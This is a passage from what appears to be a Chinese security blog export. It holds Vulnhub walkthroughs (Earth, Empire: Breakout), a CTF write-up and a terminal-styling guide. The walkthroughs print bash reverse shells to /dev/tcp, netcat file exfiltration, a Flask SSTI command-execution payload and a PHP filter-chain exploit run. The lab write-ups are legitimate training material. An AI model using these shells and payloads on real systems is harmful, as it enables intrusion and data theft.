37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40</span><br><span class="line">- 3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45</span><br><span class="line">- 2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a</span><br></pre></td></tr></table></figure><p>前两个 xor 出来都是乱的，只有最后一个是正常的，是 <code>earthclimatechangebad4humans</code> 的重复，猜测可能是密钥</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250429222923.png"></p><p><code>terra/earthclimatechangebad4humans</code> 成功登录进管理员界面，是一个 cmd 命令执行框，用户是 apache 用户，连登录权限都没有，试试反弹 shell，过滤点号，点分转一手十进制</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/3232295553/9099 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>在 <code>/var/earth_web</code> 目录下找到一个 <code>user_flag.txt</code> 拿到第一个 flag</p><blockquote><p><code>[user_flag_3353b67d6437f07ba7d34afd7d2fc27d]</code></p></blockquote><p>然后信息搜集为提权做准备</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -writable -<span class="built_in">type</span> d 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250430002726.png"></p><p>找出来一个奇怪的程序，应该是准备好可以用来提权的，但是执行失败了，nc 传出来分析一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nc 传文件</span></span><br><span class="line">nc 192.168.234.129 9098 &lt; /usr/bin/reset_root <span class="comment"># 受控端</span></span><br><span class="line">nc -lp 9098 &gt; reset_root <span class="comment"># vps</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分析程序0.</span></span><br><span class="line">strace -f -F ./reset_root <span class="comment"># -f和-F表示同时跟踪fork和vfork出来的进程</span></span><br><span class="line">ltrace ./reset_root <span class="comment"># 用来跟踪进程调用库函数的情况</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250502151111401.png" alt="image-20250502151111401"></p><p>主要是这三个触发器分别检测 <code>/dev/shm/kHgTFI5G</code>、<code>/dev/shm/Zw7bV9U5</code>、<code>/tmp/kcM0Wewe</code> 这三个文件或者目录是否存在，不存在就不执行，存在就继续执行。那就创建一下，然后再执行。成功拿到密码并提权</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250430003509.png"></p><p>然后在 root 目录下拿到第二个 flag</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250502151117586.png" alt="image-20250502151117586"></p><blockquote><p><code>[root_flag_b0da9554d29db2117b02aa8b66ec492e]</code></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Empire: Breakout</title>
      <link href="/articles/37df81e9.html"/>
      <url>/articles/37df81e9.html</url>
      
        <content type="html"><![CDATA[<h2 id="Empire-Breakout"><a href="#Empire-Breakout" class="headerlink" title="Empire: Breakout"></a>Empire: Breakout</h2><blockquote><p><a href="https://www.vulnhub.com/entry/empire-breakout,751/">靶机地址</a></p></blockquote><p>通过 nmap 扫描拿到 IP 和开放的端口</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250501153748009.png" alt="image-20250501153748009"></p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250501153741507.png" alt="image-20250501153741507"></p><p>访问 80 端口知道是一个 Ubuntu+Apache 的服务器，但是在下边藏了一个 hint</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250501153801253.png" alt="image-20250501153801253"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">don&#x27;t worry no one will get here, it&#x27;s safe to share with you my access. Its encrypted :)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;++++++++++++++++.++++.&gt;&gt;+++++++++++++++++.----.&lt;++++++++++.-----------.&gt;-----------.++++.&lt;&lt;+.&gt;-.--------.++++++++++++++++++++.&lt;------------.&gt;&gt;---------.&lt;&lt;++++++.++++++.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><p>这个是 brainfuck 语言，这里给一个在线的和本地的：<br><a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a><br><a href="https://github.com/fabianishere/brainfuck">https://github.com/fabianishere/brainfuck</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.2uqPEfj3D&lt;P&#x27;a-3</span><br></pre></td></tr></table></figure><p>10000 和 20000 端口一个是 Webmin 另一个是 Usermin 的登录界面。然后刚才 nmap 扫的时候，存在一个 smb 服务，知道了用户名，然后结合 brainfuck 解出来的尝试登录</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250501153727347.png" alt="image-20250501153727347"></p><p>成功登录进 20000 端口的 Usermin，然后在终端执行命令，拿到第一个 flag</p><blockquote><p><code>3mp!r3&#123;You_Manage_To_Break_To_My_Secure_Access&#125;</code></p></blockquote><p>读了下 <code>/etc/passwd</code> 发现当前用户只是一个低权限用户，也不能用 sudo 和 SUID 文件提权，那就找找有没有敏感文件泄露</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -name <span class="string">&quot;*pass*&quot;</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250501153718290.png" alt="image-20250501153718290"></p><p>找到了一个备份文件，但是没有权限读取，不过在当前目录下有一个高权限的 tar 程序，那么就可以使用当前目录下的命令进行压缩，然后再解压，就可以读取到了</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250501153711704.png" alt="image-20250501153711704"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./tar -cvf ./pass.tar /var/backups/.old_pass.bak</span><br><span class="line">tar -xvf ./pass.tar</span><br><span class="line"><span class="built_in">tac</span> var/backups/.old_pass.bak</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250501153700757.png" alt="image-20250501153700757"></p><blockquote><p><code>Ts&amp;4&amp;YurgtRX(=~h</code></p></blockquote><p>拿到了 root 用户的密码，但是不能直接在这里提权，得把 shell 反弹出来才行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.234.129/9099 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250501153651834.png" alt="image-20250501153651834"></p><blockquote><p><code>3mp!R3&#123;You_Manage_To_BreakOut_From_My_System_Congratulation&#125;</code></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋杯 冬季赛</title>
      <link href="/articles/3448e522.html"/>
      <url>/articles/3448e522.html</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h3><p>SSTI，直接出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=&#123;&#123;+url_for.__globals__[<span class="string">&quot;os&quot;</span>].popen(<span class="string">&quot;cat+flag&quot;</span>).<span class="built_in">read</span>()+&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="file-copy"><a href="#file-copy" class="headerlink" title="file_copy"></a>file_copy</h3><p>可以报错，并且看到是copy函数，那应该是PHP filter链攻击，直接打</p><p><a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">https://github.com/synacktiv/php_filter_chains_oracle_exploit</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 filters_chain_oracle_exploit.py --target <span class="string">&quot;http://eci-2ze8zzf9ivc9ygua6v2n.cloudeci1.ichunqiu.com/&quot;</span> --file <span class="string">&#x27;/flag&#x27;</span> --parameter path</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250117223039111.png" alt="image-20250117223039111"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h3 id="See-anything-in-these-pics"><a href="#See-anything-in-these-pics" class="headerlink" title="See anything in these pics?"></a>See anything in these pics?</h3><p>爆破zip，拿到密码5FIVE</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/20250117222723.png"></p><p>然后发现jpg里还有一张png图片，foremost分离后，修复png宽高拿到flag</p><p>flag{opium_00pium}</p><h3 id="简单算术"><a href="#简单算术" class="headerlink" title="简单算术"></a>简单算术</h3><p>已知是异或，且前缀为flag逆推密钥，然后异或拿到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">encrypted_text = <span class="string">&quot;ys~xdg/m@]mjkz@vl@z~lf&gt;b&quot;</span></span><br><span class="line">flag_prefix = <span class="string">&quot;flag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 恢复密钥</span></span><br><span class="line">key = [<span class="built_in">ord</span>(c) ^ <span class="built_in">ord</span>(flag_prefix[i]) <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(encrypted_text[:<span class="number">4</span>])]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用恢复的密钥解密剩余的文本</span></span><br><span class="line">decrypted_text = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c) ^ key[i % <span class="built_in">len</span>(key)]) <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(encrypted_text))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decrypted_text)</span><br></pre></td></tr></table></figure><h3 id="压力大，写个脚本吧"><a href="#压力大，写个脚本吧" class="headerlink" title="压力大，写个脚本吧"></a>压力大，写个脚本吧</h3><p>100层zip，password_x.txt里边是base64编码后的zip_x.zip密码，写个脚本解压</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyzipper</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unzip</span>(<span class="params"><span class="built_in">zip</span>, password, output_dir</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> pyzipper.AESZipFile(<span class="built_in">zip</span>) <span class="keyword">as</span> zf:</span><br><span class="line">            zf.pwd = password.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            zf.extractall(output_dir)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;解压 <span class="subst">&#123;<span class="built_in">zip</span>&#125;</span> 完成&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;解压 <span class="subst">&#123;<span class="built_in">zip</span>&#125;</span> 失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">batch_unzip</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="built_in">zip</span> = <span class="string">f&quot;zip_<span class="subst">&#123;i&#125;</span>.zip&quot;</span></span><br><span class="line">        password_file = <span class="string">f&quot;password_<span class="subst">&#123;i&#125;</span>.txt&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(password_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            password = f.read().strip()</span><br><span class="line">        password = base64.b64decode(password).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        unzip(<span class="built_in">zip</span>, password, output_dir=<span class="string">f&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">batch_unzip()</span><br></pre></td></tr></table></figure><p>拿到一个flag_hint：<code>PASSWORD+PASSWORD.png</code></p><p>然后发现password_0.txt里的经base64编码以后是89504E，那么应该就是从0到99来拼接了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">base64_password = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100</span>):</span><br><span class="line">    password_file = <span class="string">f&quot;password_<span class="subst">&#123;i&#125;</span>.txt&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(password_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        password = f.read().strip()</span><br><span class="line">        base64_password += password</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64_password)</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(base64_password).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><p>把后边那一堆FG删掉，拿到一个二维码，扫描拿到flag</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/876f7356-ffc4-4153-b32a-f60c6b9e99c3.png" alt="img"></p><h3 id="简单镜像提取"><a href="#简单镜像提取" class="headerlink" title="简单镜像提取"></a>简单镜像提取</h3><p>wireshark打开，拿到一个<code>please recovery.zip</code>，解压之后拿到一个.img文件，但是是损坏的，根据题目描述下载妙妙小工具，拿到flag</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/b8b021bb-823c-431c-92c2-9563baf7a9ca.png" alt="img"></p><blockquote><p> 我最开始还下成了另外一个RStudio，还下了一个R。。。。</p></blockquote><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h3 id="通往哈希的旅程"><a href="#通往哈希的旅程" class="headerlink" title="通往哈希的旅程"></a>通往哈希的旅程</h3><p>根据题目使用hashcat掩码爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 100 -a 3 -o cracked.txt hash.txt 188?d?d?d?d?d?d?d?d</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/1280X1280.PNG" alt="img"></p><h3 id="你是小哈斯"><a href="#你是小哈斯" class="headerlink" title="你是小哈斯?"></a>你是小哈斯?</h3><p>打开文件是一堆sha1，爆破几个之后发现全是单个字符进行sha1加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">chars = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!\&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~ &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sha1_hash_string</span>(<span class="params">input_string</span>):</span><br><span class="line">    sha1_hash = hashlib.sha1(input_string.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> sha1_hash</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;题目内容.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    lines = file.readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        hashed_char = sha1_hash_string(char)</span><br><span class="line">        <span class="keyword">if</span> line.strip() == hashed_char:</span><br><span class="line">            <span class="built_in">print</span>(char, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>flag{game_cqb_isis_cxyz}</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>终端美化</title>
      <link href="/articles/5e70877f.html"/>
      <url>/articles/5e70877f.html</url>
      
        <content type="html"><![CDATA[<p>不想学习的时候，总是会找点东西来折腾，那就记录一下吧。。。</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="安装oh-my-posh"><a href="#安装oh-my-posh" class="headerlink" title="安装oh-my-posh"></a>安装oh-my-posh</h3><p>下载<a href="https://github.com/JanDeDobbeleer/oh-my-posh/releases">oh-my-bash</a>，需注意安装路径不要有中文且不能有空格。</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20241120104401433.png" alt="image-20241120104401433"></p><p>然后打开终端，输入<code>oh-my-posh</code>命令，出现如下内容就证明安装成功。若出现<code>oh-my-posh不是内部或外部命令，也不是可运行的程序 或批处理文件。</code>，则安装失败。</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20241120104543817.png" alt="image-20241120104543817"></p><h3 id="安装Clink"><a href="#安装Clink" class="headerlink" title="安装Clink"></a>安装Clink</h3><p>下载<a href="https://chrisant996.github.io/clink/">Clink</a>，下载完毕运行exe文件，一路点next进行安装。然后重新打开终端，能够查看到clink版本，且会智能补全代码</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20241120105547723.png" alt="image-20241120105547723"></p><h3 id="下载Nerd字体"><a href="#下载Nerd字体" class="headerlink" title="下载Nerd字体"></a>下载Nerd字体</h3><p>为了防止后边有些文字和图标乱码，下载<a href="https://www.nerdfonts.com/font-downloads">Nerd</a>字体</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20241120105820445.png" alt="image-20241120105820445"></p><p>可以看到有很多字体，并且在下边均有预览效果（我选择的是CaskaydiaCove Nerd Font）请记住自己下载的是什么字体，后边会用到。下载解压以后可以全选ttf后缀文件安装，或者将之复制到<code>C:\Windows\Fonts</code>路径下。</p><h2 id="美化"><a href="#美化" class="headerlink" title="美化"></a>美化</h2><h3 id="更改终端背景图和字体"><a href="#更改终端背景图和字体" class="headerlink" title="更改终端背景图和字体"></a>更改终端背景图和字体</h3><p>首先打开终端设置</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20241120103901208.png" alt="image-20241120103901208"></p><p>打开JSON文件</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20241120103934267.png" alt="image-20241120103934267"></p><p>编辑设置，在<code>defaults</code>中添加参数：<code>backgroundImage</code>为背景图路径，<code>backgroundImageOpacity</code>为透明度，我设置的是30%，<code>font</code>中为字体，<code>CaskaydiaCove Nerd Font</code>请更改为自己下载的字体名称。</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20241120110633953.png" alt="image-20241120110633953"></p><p>重新打开终端就可以看到背景图已经变了</p><h3 id="Command-Prompt-美化"><a href="#Command-Prompt-美化" class="headerlink" title="Command Prompt 美化"></a>Command Prompt 美化</h3><p>找到clink的安装路径（默认应为<code>C:\Program Files (x86)\clink</code>），在文件夹中创建一个文件<code>oh-my-posh.lua</code>，添加以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load(io.popen(&#x27;oh-my-posh init cmd&#x27;):read(&quot;*a&quot;))()</span><br></pre></td></tr></table></figure><p>打开终端可以发现，已经加载好了美化主题</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20241120111426446.png" alt="image-20241120111426446"></p><p>oh-my-posh安装时自带了很多美化主题，在oh-my-posh的themes文件夹下，可以在官方网站中进行<a href="https://ohmyposh.dev/docs/themes">预览</a>，也可以自定义主题（我的就是自己折腾的）。如果想要更换美化主题，则增加一个<code>config</code>参数，后续路径为主题配置文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load(io.popen(&quot;oh-my-posh init cmd --config D:\\tools\\oh-my-posh\\themes\\my.omp.json&quot;):read(&quot;*a&quot;))()</span><br></pre></td></tr></table></figure><p>看看效果叭</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20241120132040399.png" alt="image-20241120132040399"></p><h3 id="Power-Shell-美化"><a href="#Power-Shell-美化" class="headerlink" title="Power Shell 美化"></a>Power Shell 美化</h3><p>在正式开始之前我们先更新一下PowerShell，打开PowerShell使用<code>host</code>命令检查当前版本，为5.1，win11默认都是5.1，需要手动升级。7以后支持历史命令补全，智能提示常用命令。输入如下命令进行更新</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winget install <span class="literal">--id</span> Microsoft.Powershell <span class="literal">--source</span> winget</span><br></pre></td></tr></table></figure><p>然后修改默认PowerShell终端，打开设置，更改为刚刚下载的位置，默认为<code>C:\Program Files\PowerShell\7\pwsh.exe</code>，然后保存关闭终端。</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20241120112903287.png" alt="image-20241120112903287"></p><p>重新打开会发现已经是7.x版本的了，也有了代码自动补全功能</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20241120113259035.png" alt="image-20241120113259035"></p><p>再使用管理员权限打开PowerShell，运行如下命令，加载一下配置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 设置 PowerShell 的执行策略为 RemoteSigned</span><br><span class="line">set-executionpolicy RemoteSigned</span><br><span class="line"></span><br><span class="line"># 查看 PowerShell 的输出编码格式</span><br><span class="line">$OutputEncoding</span><br><span class="line"></span><br><span class="line"># 检查 $PROFILE 路径是否存在</span><br><span class="line">Test-path $profile</span><br><span class="line"></span><br><span class="line"># 如果 $PROFILE 配置文件不存在，New-Item 命令会创建该文件</span><br><span class="line">New-Item -Type file -Force $PROFILE</span><br><span class="line"></span><br><span class="line"># powershell初始化加载 PSReadLine 模块</span><br><span class="line">Import-Module PSReadLine</span><br><span class="line"></span><br><span class="line"># 使用历史记录进行脚本提示</span><br><span class="line">Set-PSReadLineOption -PredictionSource History</span><br><span class="line"></span><br><span class="line"># alt在windows中有特殊用途，我个人更喜欢Tab，所以这里使用Tab键代替</span><br><span class="line">Set-PSReadLineKeyHandler -Chord &quot;Tab&quot; -Function ForwardWord</span><br></pre></td></tr></table></figure><p>如果<code>Test-path $profile</code>返回<code>False</code>，且<code>New-Item -Type file -Force $PROFILE</code>无法创建配置文件，则需手动在<code>C:\Users\&lt;用户名&gt;\Documents\PowerShell\</code>文件夹下创建<code>Microsoft.PowerShell_profile.ps1</code>文件，若<code>PowerShell</code>文件夹也不存在，那么还需创建<code>PowerShell</code>文件夹。</p><p>然后编辑刚刚创建的配置文件，可以用命令打开，也可以手动打开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">notepad $PROFILE# 记事本打开</span><br><span class="line">vim $PROFILE# vim打开</span><br></pre></td></tr></table></figure><p>然后添加如下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oh-my-posh init pwsh --config D:\\tools\\oh-my-posh\\themes\\my.omp.json | Invoke-Expression</span><br></pre></td></tr></table></figure><p>看看效果叭</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20241120131952749.png" alt="image-20241120131952749"></p><h3 id="git-bash-美化"><a href="#git-bash-美化" class="headerlink" title="git bash 美化"></a>git bash 美化</h3><p>打开git bash命令行窗口，先输入如下命令检查$HOME和oh-my-bash是否正常</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo $HOME# 如果显示/c/Users/&lt;你的用户名&gt;，就表示没有问题</span><br><span class="line">oh-my-posh --version# 如果能正常显示版本号，就没有问题，否则需检查环境变量</span><br></pre></td></tr></table></figure><blockquote><p>若<code>echo $HOME</code>回显不正常，则首先需进入用户主目录（<code>C:\Users\&lt;你的用户名&gt;</code>），然后打开git bash终端执行如下两条命令：<code>echo &#39;export HOME=&quot;/c/Users/&lt;你的用户名&gt;&quot;&#39; &gt; .bashrc</code> 和 <code>source ~/.bashrc</code></p></blockquote><p>若均正常，则执行如下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;eval &quot;$(oh-my-posh --init --shell bash --config D:\\tools\\oh-my-posh\\themes\\my.omp.json)&quot;&#x27; &gt; ~/.bashrc</span><br><span class="line">source 